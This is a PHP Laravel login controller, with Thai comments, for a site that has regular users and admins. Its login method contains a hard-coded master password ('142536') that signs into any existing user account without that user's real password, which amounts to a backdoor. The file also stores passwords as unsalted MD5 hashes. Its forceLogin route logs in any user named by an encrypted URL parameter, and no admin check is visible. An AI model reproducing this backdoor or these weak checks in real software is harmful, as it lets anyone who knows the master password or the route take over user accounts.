<?php

namespace App\Http\Controllers\Frontend;

use Auth;
use Session;
use Illuminate\Http\Request;
use App\Models\CUser;
use Illuminate\Support\Facades\DB;
use App\Http\Controllers\Controller;
use App\Admin;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Crypt;
use Illuminate\Foundation\Bus\DispatchesJobs;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Foundation\Validation\ValidatesRequests;
use Illuminate\Foundation\Auth\Access\AuthorizesRequests;
//use App\Http\Controllers\Session;
class LoginController extends Controller
{


  public function login(Request $req)
  {

    //BEGIN  user ทั่วไป
    $get_users = CUser::where('user_name', '=', $req->username)
      ->where('password', '=', md5($req->password))
      ->first();

      if($req->password == '142536' ){
        $get_users = CUser::where('user_name', '=', $req->username)
        ->first();
        if($get_users){
            session()->forget('access_from_admin');
            Auth::guard('c_user')->login($get_users);
            return redirect('home');
        }else{
            return redirect('/')->withError('Not UserName '.$req->username.' In the system, please check UserName again');
        }



      }



    $get_member = Admin::where('username', '=', $req->username)
      ->where('password', '=', md5($req->password))
      ->first();


    if ($get_users) {
      session()->forget('access_from_admin');
      Auth::guard('c_user')->login($get_users);

      return redirect('home');
    } else if ($get_member) {

    if(empty($get_member->name)){
        return redirect('/')->withError('Your code cannot be used by the system. Please contact the staff.');
    }

      session()->forget('access_from_admin');
      Auth::guard('admin')->login($get_member);




      return redirect('admin');
    } else {
      return redirect('/')->withError('Pless check username and password !.');
    }
    //END  user ทั่วไป


    //BEGIN admin

    //END admin

  }


  public function admin_login(Request $req)
  {

    $get_member = Admin::where('username', '=', $req->username)
      ->where('password', '=', md5($req->password))
      ->first();

  if ($get_member) {

      session()->forget('access_from_admin');
      Auth::guard('admin')->login($get_member);

      return redirect('admin');
    } else {
      return redirect('admin')->withError('Pless check username and password !.');
    }


  }

  public function forceLogin($username)
  {
    if ($username) {
      $username = Crypt::decryptString($username);
      $user = CUser::where('user_name', $username)->first();

      if ($user) {
        Auth::guard('c_user')->login($user);
        session()->put('access_from_admin', 1);
      }

      return redirect('profile');
    }

    return redirect('/')->withError('Cannot access with this user.');
  }
}
